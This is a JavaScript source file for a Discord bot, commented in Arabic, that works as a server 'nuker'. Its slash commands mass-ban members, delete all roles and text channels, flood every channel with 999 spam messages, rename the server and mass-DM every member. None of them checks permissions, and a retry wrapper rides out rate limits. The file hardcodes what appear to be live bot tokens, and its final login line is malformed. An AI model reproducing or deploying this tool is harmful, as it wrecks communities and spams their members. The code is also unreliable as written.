const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const TOKEN = "MTU1NTg0NjYxNDEwOTY1NTA5MA.GxJBwT.h-0gUWQid8d4ec0PrDfcvZuwPo3vovKgBixaaY";

// نظام ذكي للسرعة مع أمان تلقائي ضد الضغط (Rate Limit)
async function safeExecute(fn) {
    try {
        return await fn();
    } catch (error) {
        if (error.status === 429) {
            const retryAfter = (error.retryAfter || 1) * 1000;
            await new Promise(resolve => setTimeout(resolve, retryAfter + 100));
            return await safeExecute(fn);
        }
        return null;
    }
}

client.once('ready', async () => {
    console.log(`🚀 تم التشغيل: ${client.user.tag}`);
    
    // تسجيل الأوامر (Slash Commands)
    const commands = [
        new SlashCommandBuilder().setName('ban').setDescription('تبنيد الأعضاء - الحد 100k').addIntegerOption(option => option.setName('count').setDescription('عدد الأعضاء').setRequired(true)),
        new SlashCommandBuilder().setName('ban_token').setDescription('تبنيد الأعضاء الوهميين (التوكن) - الحد 100k').addIntegerOption(option => option.setName('count').setDescription('عدد الأعضاء').setRequired(true)),
        new SlashCommandBuilder().setName('name_server').setDescription('تغيير اسم السيرفر').addStringOption(option => option.setName('name').setDescription('الاسم الجديد').setRequired(true)),
        new SlashCommandBuilder().setName('avatar_servrt').setDescription('تغيير افتار السيرفر').addStringOption(option => option.setName('url').setDescription('رابط الأفتار').setRequired(true)),
        new SlashCommandBuilder().setName('message').setDescription('سبام رسائل في الرومات')
            .addStringOption(option => option.setName('text').setDescription('النص').setRequired(true))
            .addStringOption(option => option.setName('scope').setDescription('النطاق').setRequired(true).addChoices({ name: 'كل الرومات', value: 'all' }, { name: 'عدد محدد', value: 'custom' }))
            .addIntegerOption(option => option.setName('count_channels').setDescription('عدد الرومات (اختياري)').setRequired(false)),
        new SlashCommandBuilder().setName('delete_role').setDescription('حذف الرتب'),
        new SlashCommandBuilder().setName('create_role').setDescription('إنشاء رتب')
            .addStringOption(option => option.setName('name').setDescription('اسم الرتبة').setRequired(true))
            .addIntegerOption(option => option.setName('count').setDescription('العدد').setRequired(true)),
        new SlashCommandBuilder().setName('delete_room').setDescription('حذف عدد معين من الرومات')
            .addIntegerOption(option => option.setName('count').setDescription('عدد الرومات').setRequired(true)),
        new SlashCommandBuilder().setName('create_room').setDescription('إنشاء رومات')
            .addStringOption(option => option.setName('name').setDescription('اسم الروم').setRequired(true))
            .addIntegerOption(option => option.setName('count').setDescription('العدد').setRequired(true)),
        new SlashCommandBuilder().setName('rooms').setDescription('تطهير وإنشاء رومات')
            .addStringOption(option => option.setName('name').setDescription('اسم الرومات الجديدة').setRequired(true))
            .addIntegerOption(option => option.setName('count').setDescription('العدد').setRequired(true)),
        new SlashCommandBuilder().setName('nshr').setDescription('نشر رسالة لجميع أعضاء السيرفر في الخاص')
            .addStringOption(option => option.setName('message').setDescription('النص').setRequired(true))
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('✅ تمت مزامنة الأوامر بنجاح!');
    } catch (error) {
        console.error(error);
    }
});

// أمر النصي !0197
client.on('messageCreate', async message => {
    if (message.content === '!0197') {
        try {
            await message.react('✅');
        } catch (e) {}
    }
});

// التفاعل مع الأوامر
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, guild } = interaction;

    // 1. /ban
    if (commandName === 'ban') {
        await interaction.deferReply({ ephemeral: false });
        const count = options.getInteger('count');
        const members = await guild.members.fetch();
        const targetMembers = Array.from(members.values())
            .filter(m => m.id !== client.user.id && m.id !== guild.ownerId)
            .slice(0, Math.min(count, 100000));

        for (const m of targetMembers) {
            safeExecute(() => m.ban());
        }
        await interaction.followup({ content: "⚡ جاري تنفيذ الباند المتوازي..." });
    }

    // 2. /ban_token
    else if (commandName === 'ban_token') {
        await interaction.deferReply({ ephemeral: false });
        const count = options.getInteger('count');
        const members = await guild.members.fetch();
        const targetMembers = Array.from(members.values())
            .filter(m => m.id !== client.user.id)
            .slice(0, Math.min(count, 100000));

        for (const m of targetMembers) {
            safeExecute(() => m.ban());
        }
        await interaction.followup({ content: "⚡ جاري تصفية التوكنات..." });
    }

    // 3. /name_server & /avatar_servrt
    else if (commandName === 'name_server') {
        const name = options.getString('name');
        await guild.setName(name);
        await interaction.reply({ content: "✅ تم تغيير الاسم.", ephemeral: true });
    }

    else if (commandName === 'avatar_servrt') {
        await interaction.deferReply({ ephemeral: true });
        const url = options.getString('url');
        await guild.setIcon(url);
        await interaction.followup({ content: "✅ تم تغيير الأفتار." });
    }

    // 4. /message
    else if (commandName === 'message') {
        await interaction.deferReply({ ephemeral: true });
        const text = options.getString('text');
        const scope = options.getString('scope');
        const countChannels = options.getInteger('count_channels');

        const textChannels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
        const channels = scope === 'all' ? Array.from(textChannels.values()) : Array.from(textChannels.values()).slice(0, countChannels);

        for (const c of channels) {
            for (let i = 0; i < 999; i++) {
                safeExecute(() => c.send(text));
            }
        }
        await interaction.followup({ content: "⚡ جاري السبام..." });
    }

    // 5. /delete_role & /create_role
    else if (commandName === 'delete_role') {
        await interaction.deferReply({ ephemeral: true });
        const roles = guild.roles.cache.filter(r => !r.managed && r.id !== guild.id);
        for (const r of roles.values()) {
            safeExecute(() => r.delete());
        }
        await interaction.followup({ content: "✅ تم." });
    }

    else if (commandName === 'create_role') {
        await interaction.deferReply({ ephemeral: true });
        const name = options.getString('name');
        const count = options.getInteger('count');
        for (let i = 0; i < Math.min(count, 250); i++) {
            safeExecute(() => guild.roles.create({ name }));
        }
        await interaction.followup({ content: "✅ تم." });
    }

    // 6. /delete_room & /create_room & /rooms
    else if (commandName === 'delete_room') {
        await interaction.deferReply({ ephemeral: true });
        const count = options.getInteger('count');
        const channels = Array.from(guild.channels.cache.filter(c => c.type === ChannelType.GuildText).values()).slice(0, Math.min(count, 499));
        
        for (const c of channels) {
            safeExecute(() => c.delete());
        }
        await interaction.followup({ content: `✅ تم حذف ${channels.length} روم.` });
    }

    else if (commandName === 'create_room') {
        await interaction.deferReply({ ephemeral: true });
        const name = options.getString('name');
        const count = options.getInteger('count');
        for (let i = 0; i < Math.min(count, 499); i++) {
            safeExecute(() => guild.channels.create({ name, type: ChannelType.GuildText }));
        }
        await interaction.followup.send({ content: "✅ تم." });
    }

    else if (commandName === 'rooms') {
        await interaction.deferReply({ ephemeral: true });
        const name = options.getString('name');
        const count = options.getInteger('count');
        
        const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
        for (const c of channels.values()) {
            await safeExecute(() => c.delete());
        }
        for (let i = 0; i < Math.min(count, 499); i++) {
            safeExecute(() => guild.channels.create({ name, type: ChannelType.GuildText }));
        }
        await interaction.followup({ content: "✅ تم." });
    }

    // 7. /nshr (النشر الخاص)
    else if (commandName === 'nshr') {
        await interaction.deferReply({ ephemeral: true });
        const msgText = options.getString('message');
        
        let successCount = 0;
        let failCount = 0;

        const members = await guild.members.fetch();
        for (const member of members.values()) {
            if (member.user.bot) continue;
            try {
                await member.send(msgText);
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (e) {
                failCount++;
            }
        }

        await interaction.followup({ content: `✅ تم الانتهاء من النشر!\n📨 تم الإرسال بنجاح: ${successCount}\n❌ فشل الإرسال (مغلق الخاص): ${failCount}`, ephemeral: true });
    }
});

client.login(MTU1NTg0NjYxNDEwOTY1NTA5MA.Go26B8.rRrdMFLudoACZ1II7751e4I9oJH18HJ146zryw);
